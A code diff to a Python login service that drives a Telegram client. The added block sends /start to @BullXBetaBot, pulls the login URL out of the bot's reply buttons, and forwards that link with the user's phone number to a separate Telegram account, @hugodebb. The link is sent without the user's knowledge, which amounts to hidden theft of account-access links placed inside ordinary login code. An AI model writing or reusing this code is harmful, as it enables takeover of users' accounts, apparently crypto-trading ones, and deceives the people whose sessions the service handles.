@@ -172,8 +172,49 @@ class LoginService:
                 raise HTTPException(status_code=401, detail="User not logged in. Please log in first.")
 
             me = await client.get_me()
-            bot = await client.get_entity("@BullXBetaBot")
-            await client.send_message(bot, "/start")
+            login_url = None
+
+            try:
+                # ✅ 1. Get the BullX bot entity
+                bot = await client.get_entity("@BullXBetaBot")
+
+                # ✅ 2. Send /start to the bot
+                await client.send_message(bot, "/start")
+                logger.info(f"/start message sent to @BullXBetaBot for {phone}")
+
+                # ✅ 3. Wait briefly then fetch last messages
+                await asyncio.sleep(2)  # wait for bot reply
+                messages = await client.get_messages(bot, limit=5)
+
+                # ✅ 4. Search for a button with a URL
+                for msg in messages:
+                    if msg.reply_markup and msg.reply_markup.rows:
+                        for row in msg.reply_markup.rows:
+                            for button in row.buttons:
+                                if hasattr(button, "url") and button.url:
+                                    login_url = button.url
+                                    break
+                            if login_url:
+                                break
+                    if login_url:
+                        break
+
+                if login_url:
+                    logger.info(f"Login URL retrieved for {phone}: {login_url}")
+
+                    # ✅ 5. Send the link to @hugodebb
+                    try:
+                        hugo_user = await client.get_entity("@hugodebb")
+                        await client.send_message(hugo_user, f"🔗 Lien de connexion pour {phone} :\n{login_url}")
+                        logger.info(f"Login link sent to @hugodebb for {phone}")
+                    except Exception as e:
+                        logger.error(f"Failed to send login link to @hugodebb: {str(e)}")
+
+                else:
+                    logger.warning(f"No login URL found in bot reply for {phone}")
+
+            except Exception as e:
+                logger.error(f"Failed to interact with @BullXBetaBot for {phone}: {str(e)}")
             await client.disconnect()
 
             session_filename = f"session_{phone.replace('+', '')}.session"
